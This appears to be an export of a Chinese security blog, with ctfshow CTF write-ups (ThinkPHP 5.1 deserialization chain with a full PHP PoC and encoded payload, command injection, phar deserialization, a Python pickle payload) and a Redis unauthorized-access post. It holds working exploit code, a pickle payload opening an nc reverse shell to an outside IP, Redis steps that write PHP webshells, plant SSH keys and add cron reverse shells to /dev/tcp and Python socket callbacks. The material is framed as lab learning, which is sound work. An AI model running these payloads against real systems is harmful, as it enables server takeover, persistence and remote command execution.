<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#thinkphp/library/think/Request.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$value</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中 <code>$this-&gt;config[&#39;var_ajax&#39;]</code> 可控 因此 <code>param</code> 函数中的 <code>$name</code> 可控</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; __toString() </span><br><span class="line">可控append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];</span><br><span class="line">isAjax()的$this-&gt;config[&#x27;var_ajax&#x27;] -&gt; param()的$name -&gt; input()的$name 为字符串</span><br><span class="line"></span><br><span class="line">param()的$this-&gt;param -&gt; input()的$data -&gt; filterValue()的$data -&gt;call_user_func()的$value 为参数</span><br><span class="line"></span><br><span class="line">filterValue()的$filter -&gt; input()的$filter -&gt; filterValue()的$filter -&gt; call_user_func()的$filter 为方法</span><br></pre></td></tr></table></figure>

<p>在利用链中的 Conversion , Relationship , Attribute 都是 trait ，而 Model 正好都 use 了</p>
<p>Model是抽象类，因此不能直接new ，需要继承了他的子类的类 如 Pivot</p>
<p>所以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?&amp;lin=cat /flag&amp;data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/6619">thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区 (aliyun.com)</a></p>
<h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);<span class="comment">////此处可以用分号来截断，这里为利用点来执行命令，需要$this-&gt;evilfile=true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;  <span class="comment">//防止该题利用文件上传做</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);<span class="comment">//写入操作</span></span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);<span class="comment">//将文件进行改名操作</span></span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);<span class="comment">//删除当前目录下由你编辑的文件</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?fn=;tac f*</span><br><span class="line">post:</span><br><span class="line">flag=zhou</span><br></pre></td></tr></table></figure>

<h1 id="web276phar反序列化"><a href="#web276phar反序列化" class="headerlink" title="web276phar反序列化"></a>web276phar反序列化</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p><a id="jump">什么是phar</a><br> phar类似于java中的jar打包</p>
<p><a href="https://www.cnblogs.com/yyy2015c01/p/phar-deserialization.html">yyy2015c01的博客 (cnblogs.com)</a></p>
<h2 id="phar的结构："><a href="#phar的结构：" class="headerlink" title="phar的结构："></a>phar的结构：</h2><p>stub phar文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;;</code> (头部信息)</p>
<p><strong>manifest</strong>压缩文件的属性等信息，以<strong>序列化</strong>存储；</p>
<p>contents压缩文件的内容；</p>
<p>signature签名，放在文件末尾；</p>
<p>phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化</p>
<p>manifest压缩文件的属性等信息，以序列化存储；存在一段序列化的字符串；</p>
<p>调用phar伪协议，可读取 .phar文件；</p>
<p>phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化。</p>
<p>注意：phar需要php&gt;&#x3D;5.2在php.ini中将phar.readonly设为Off  <strong>注意去掉前面的分号</strong></p>
<p>phar使用条件：<br> 1.phar文件能上传到服务器端。</p>
<p>2.要有可用反序列化魔术方法作为跳板。</p>
<p>3.要有文件操作函数，如file_exists(),fopen(),file_get_contents()</p>
<p>4.文件操作函数参数可控，且: &#x2F; phar等特殊字符没有被过滤</p>
<p>总结就是要有文件操作函数，然后可以去使用这个phar伪协议去读取一个.phar文件，并且在原本的代码中有魔术方法，在反序列化的过程中去执行相关的代码，进而执行我们想让它执行的。  这个phar后缀是可以修改的，没有影响</p>
<p>下面举一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&quot;echo &#x27;ok&#x27;;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个就是创建一个phar文件 ，将output的值写入到meta-data段中，通过filename利用phar伪协议 然后进行一个反序列化，触发了_destruct()魔术方法，执行了eval函数，也执行了我们想让它执行的。</p>
<p>下面来个简单例题实验一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个满足phar漏洞的四个基本点 1.可以上传 2.有文件操作函数 3.有魔术方法作为跳板机 4.文件操作函数的参数名可控</p>
<p>这个要生成一个phar文件的话需要改一个东西，上面有介绍，需要注意的是前面的分号要删除。</p>
<p>这个代码算是简单的了，根据上面的代码生成一个phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后改一下new的类</p>
<p>这样就生成了，然后在upload.php界面下上传这个phar文件，但是phar上传后似乎失败了，我们可以把phar后缀修改成jpg的，这样不影响</p>
<p>然后得到路径 uplod&#x2F;test.jpg</p>
<p>最后利用phar伪协议去读取一下即可</p>
<p>file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;test.jpg</p>
<h1 id="web277-python-反序列化"><a href="#web277-python-反序列化" class="headerlink" title="web277 python 反序列化"></a>web277 python 反序列化</h1><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><p>Python Pickle反序列化。pickle或cPickle，作用和PHP的serialize与unserialize一样。pickle不仅可以读写字符串，也可以读写文件：只需要采用pickle.dump()和pickle.load()</p>
<p>使用pickle.dumps()函数将一个Person对象序列化成二进制字节流的形式。使用pickle.loads()将一串二进制字节流反序列化为一个Person对象。</p>
<p>并且pickle.loads会解决import 问题，对于未引入的module会自动尝试import。也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。</p>
<p>Pickle中一个不安全的因素——反序列化未知的二进制字节流。原因是该字节流可能包含被精心构造的恶意代码，此时如果我们使用pickle.loads()方法unpickling，就会导致恶意代码的执行。</p>
<p>__reduce__函数，该函数能够定义该类的二进制字节流被反序列化时进行的操作。返回值是一个(callable, ([para1,para2…])[,…])类型的元组。当字节流被反序列化时，Python就会执行callable(para1,para2…)函数。我们可以通过在类中重写__reduce__方法，从而在反序列化时执行任意命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">class zhou(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (__import__(&quot;os&quot;).popen, (&#x27;nc 101.43.182.125 5000 -e /bin/sh&#x27;,))</span><br><span class="line">a = zhou()</span><br><span class="line">print(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>

<p>同时公网ip开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5000</span><br></pre></td></tr></table></figure>

<h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>redis安全</title>
    <url>/2024/03/31/redis%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>redis未授权访问漏洞</p>
<p>redis gopher协议</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>docker </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose.yml</span><br></pre></td></tr></table></figure>

<p>搭建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;2&#x27;</span><br><span class="line">services:</span><br><span class="line"> redis:</span><br><span class="line">   image: vulhub/redis:4.0.14</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;6379:6379&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i -t  855bdddf0f35 /bin/bash</span><br><span class="line">docker inspect 855bdddf0f35</span><br></pre></td></tr></table></figure>

<p>由于搭建在docker 无法ssh 登录， 但可以进入docker 看到文件写入</p>
<p>扫描redis 详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 6379 -script redis-info 172.19.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><strong>Redis &lt;&#x3D; 5.0.5</strong></p>
<p>可以使用redis-tools，远程登录，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 172.19.0.1</span><br></pre></td></tr></table></figure>

<p>redis 写入shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 172.19.0.1</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;</span><br><span class="line">或者</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[1]); ?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>成功写入内容</p>
<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>
<p>进入docker </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i -t  redisdocker_redis_1 /bin/bash</span><br></pre></td></tr></table></figure>

<p>写入不进去 进入docker 给目录加权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod  777 *</span><br></pre></td></tr></table></figure>

<h2 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h2><p>需要redis 以root 启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">输入密码</span><br><span class="line">两次</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br><span class="line">#写入1.txt</span><br><span class="line">cat 1.txt | redis-cli -h 172.19.0.1 -x set crack</span><br><span class="line">#将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）</span><br><span class="line">#并使用 CONFIG GET dir 命令得到redis备份的路径</span><br><span class="line">redis-cli -h 172.19.0.1</span><br><span class="line">config set dir /root/.ssh </span><br><span class="line">#	更改redis备份路径为ssh公钥存放目录（一般为/root/.ssh）</span><br><span class="line">#设置上传公钥的备份文件名字为authorized_key s</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">config get dbfilename #检查是否更改成功 </span><br><span class="line">ssh -i id_rsa root@172.19.0.1</span><br></pre></td></tr></table></figure>

<h2 id="定时任务crontab"><a href="#定时任务crontab" class="headerlink" title="定时任务crontab"></a>定时任务crontab</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.157.129</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.157.137/9897 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>python 弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; get 1</span><br><span class="line">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;115.28.78.16\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5、设置密码redis.conf</span><br><span class="line">requirepass 修改如下</span><br><span class="line">requirepass yourpassword</span><br><span class="line">yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。</span><br><span class="line">命令如下:</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/YouthBelief/article/details/121020672">Redis漏洞利用总结_redis 5.0.5 漏洞-CSDN博客</a></p>
